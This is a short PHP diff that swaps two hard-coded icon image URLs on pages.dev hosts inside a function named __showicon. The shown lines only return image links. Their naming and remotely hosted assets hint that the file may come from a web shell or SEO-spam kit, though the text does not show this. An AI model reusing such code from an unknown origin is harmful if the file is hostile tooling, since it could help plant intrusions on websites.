@@ -1234,8 +1234,8 @@ function showAnimation($name){
 	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
 }
 function __showicon($r){
-	$s['btn']='https://nabila2.pages.dev/img/iconik.png';
-	$s['alfamini']='https://nabila2.pages.dev/img/iconik.png';
+	$s['btn']='https://seo-amegakure.pages.dev/assets/icon.png';
+	$s['alfamini']='https://seo-amegakure.pages.dev/assets/icon.png';
 	$s['loader']='https://nabila2.pages.dev/img/ilong2.png';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
